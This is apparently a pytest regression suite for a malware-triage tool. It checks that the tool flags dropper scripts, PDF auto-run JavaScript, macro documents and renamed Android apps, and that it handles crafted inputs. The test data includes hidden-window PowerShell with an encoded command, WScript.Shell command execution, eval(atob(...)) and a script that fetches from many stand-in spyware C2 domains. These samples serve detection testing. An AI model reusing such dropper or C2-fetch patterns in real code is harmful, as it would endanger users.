"""Failure cases found before release (2026-11-14), each reproduced so it cannot come back."""
import os
import struct
import time
import zipfile
from types import SimpleNamespace

import pytest

from zbtriage import bugreport, filecheck as fc
from zbtriage.safetext import st_line


def _rec(tmp_path, name, data, sign=None):
    path = tmp_path / name
    path.write_bytes(data)
    return fc.fc_examine(str(path), None, sign)


# 1. droppers that were judged clean
@pytest.mark.parametrize("name, body", [
    ("run.bat", b"@echo off\r\npowershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n"),
    ("a.vbs", b'Set s = CreateObject("WScript.Shell")\r\ns.Run "cmd /c calc", 0\r\n'),
    ("x.js", b'var o = new ActiveXObject("Scripting.FileSystemObject");\n'),
    ("y.js", b"eval(atob('dmFyIGE9MTs='));\n"),
])
def test_dropper_scripts_are_worth_a_look(tmp_path, name, body):
    assert _rec(tmp_path, name, body)["level"] == fc.FC_LOOK


def test_hta_and_jar_run_like_programs(tmp_path):
    assert _rec(tmp_path, "invoice.hta", b"<html><body>hi</body></html>")["level"] == fc.FC_LOOK
    jar = tmp_path / "Invoice.jar"
    with zipfile.ZipFile(jar, "w") as z:
        z.writestr("META-INF/MANIFEST.MF", "Main-Class: a.B\n")
        z.writestr("a/B.class", b"\xca\xfe\xba\xbe")
    rec = fc.fc_examine(str(jar))
    # a .jar is a program, like an .exe: named, not flagged just for being one
    assert any("Java program" in n for n in rec["notes"])


# 2. a big PDF with random image bytes is not "JavaScript"
def test_random_stream_bytes_are_not_pdf_javascript(tmp_path):
    noise = os.urandom(6 * 1024 * 1024).replace(b"endstream", b"endstreaX")
    for _ in range(3):
        data = b"%PDF-1.7\n1 0 obj <</Length 9>>\nstream\n" + noise + b"/JS/AA/JS(\nendstream\nendobj\n%%EOF"
        rec = _rec(tmp_path, "scan.pdf", data)
        assert rec["level"] == fc.FC_CLEAN, rec["document"]


def test_real_pdf_javascript_is_still_found(tmp_path):
    rec = _rec(tmp_path, "r.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n")
    assert "runs JavaScript as soon as it is opened" in rec["document"]


# 3. hostile inputs that took minutes
def test_crafted_inputs_are_fast(tmp_path):
    started = time.time()
    _rec(tmp_path, "p.html", b"<input " * 200000)
    _rec(tmp_path, "s.lnk", b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 68 + " ".encode("utf-16-le") * 200000)
    assert time.time() - started < 10


# 4. off Windows a Windows program is not "unsigned"
def test_an_unchecked_signature_is_not_unsigned(tmp_path):
    lfanew = 0x40
    pe = bytearray(b"MZ" + b"\x00" * 58 + struct.pack("<I", lfanew) + b"PE\x00\x00" + b"\x00" * 20)
    struct.pack_into("<H", pe, lfanew + 6, 1)                      # one section
    struct.pack_into("<H", pe, lfanew + 20, 0)                     # no optional header
    sec = len(pe)
    pe += b".rsrc\x00\x00\x00" + b"\x00" * 32
    body_at = len(pe)
    struct.pack_into("<II", pe, sec + 16, 65536, body_at)
    pe += os.urandom(65536)                                        # compressed icons look random
    off_windows = lambda _path: None                               # noqa: E731 - no signature answer, as on a Mac
    rec = _rec(tmp_path, "notepad.exe", bytes(pe), sign=off_windows)
    assert rec["level"] == fc.FC_CLEAN
    assert not any(".rsrc" in p for p in rec["packing"])            # compressed icons are not packing
    assert "Signature: not checked" in fc.fc_render(rec)


# 5. MSI / .msg / .doc without macros
def test_ole_files_need_the_macro_project_name(tmp_path):
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504 + b"VBA" + os.urandom(4000)
    assert _rec(tmp_path, "setup.msi", ole)["document"] == []
    macro = ole + "_VBA_PROJECT".encode("utf-16-le")
    assert any("macros" in d for d in _rec(tmp_path, "letter.doc", macro)["document"])


# 6. an ordinary page with an inline icon is not an "SVG with a script"
def test_inline_svg_in_a_web_page_is_not_an_svg_picture(tmp_path):
    page = b"<!doctype html><html><body><svg viewBox='0 0 1 1'></svg><script>var a=1</script></body></html>"
    assert not _rec(tmp_path, "about.html", page)["web"]
    svg = b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"
    assert any("SVG" in w for w in _rec(tmp_path, "pic.svg", svg)["web"])


# 8. --json PATH is written to PATH
def test_json_goes_to_the_named_file(tmp_path):
    target = tmp_path / "out.json"
    sample = tmp_path / "a‮txt.exe"
    sample.write_bytes(b"MZ" + b"\x00" * 100)
    args = SimpleNamespace(check_file=str(sample), json=str(target), seal_copy=None)
    fc.fc_command(args, lambda a: None, out=lambda *_: None)
    text = target.read_text(encoding="utf-8")
    assert "‮" not in text and "\\u202e" in text


# 11. a failed seal leaves nothing behind
def test_a_failed_seal_removes_its_partial_zip(tmp_path, monkeypatch):
    src = tmp_path / "s.bin"
    src.write_bytes(b"x" * 5000)
    out = tmp_path / "s-sealed.zip"

    class Boom(Exception):
        pass

    def broken(*_a, **_k):
        raise Boom()
    monkeypatch.setattr(fc._ZipCrypto, "encrypt", broken)
    with pytest.raises(Boom):
        fc.fc_seal(str(src), str(out))
    assert not out.exists()
    out.write_bytes(b"keep")                                       # an existing file is never removed
    monkeypatch.undo()
    with pytest.raises(FileExistsError):
        fc.fc_seal(str(src), str(out))
    assert out.read_bytes() == b"keep"


# 12. a ZIP that claims too many entries is refused before it is opened
def test_a_zip_with_too_many_entries_is_refused(tmp_path, monkeypatch):
    path = tmp_path / "many.zip"
    with zipfile.ZipFile(path, "w") as z:
        for i in range(30):
            z.writestr("f{}.txt".format(i), "x")
    assert bugreport.zip_entry_count(str(path)) == 30
    monkeypatch.setattr(bugreport, "ZIP_MAX_ENTRIES", 10)
    with pytest.raises(ValueError):
        bugreport.zip_open(str(path))


# 14. a name from a file stays on one line
def test_names_from_files_stay_on_one_line():
    assert st_line("X\n    Nothing known‮") == "X<U+000A>    Nothing known<U+202E>"


# 16. a renamed Android app is still an app
def test_a_renamed_android_app_is_recognised(tmp_path):
    path = tmp_path / "document"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("META-INF/CERT.RSA", os.urandom(6000))
        z.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00")
        z.writestr("classes.dex", b"dex\n035\x00")
    assert fc.fc_examine(str(path))["kind"] == "android-app"


# A script carrying many spyware servers is a dropper, not a blocklist (second review).
@pytest.mark.parametrize("name", ["update.js", "run.bat", "a.vbs", "x.ps1", "page.hta"])
def test_a_script_with_many_spyware_servers_stays_a_finding(tmp_path, name):
    from zbtriage.iocs import Indicator, IocSet
    many = [Indicator("c2-{}.spy-example.net".format(i), "cc", "primary", "domain", "t", "Spyfam") for i in range(12)]
    path = tmp_path / name
    path.write_text("\n".join("fetch('https://{}/x');".format(i.value) for i in many), encoding="utf-8")
    rec = fc.fc_examine(str(path), IocSet(many, "t.txt", None))
    assert rec["level"] == fc.FC_KNOWN and not rec["indicator_list"]


# A bug report longer than the cap says so (second review).
def test_a_cut_bug_report_leaves_a_gap(tmp_path, monkeypatch):
    import test_bugreport as tb
    from zbtriage.modules import android
    monkeypatch.setattr(bugreport, "BR_MAX_TEXT", 2000)
    monkeypatch.setattr(android, "BR_MAX_TEXT", 2000)
    r = tb._run(tb._bugreport(tmp_path))
    gaps = {c.name: c.reason for c in r.checks if not c.ran}
    assert "android:bug-report-size" in gaps and "only its first" in gaps["android:bug-report-size"]
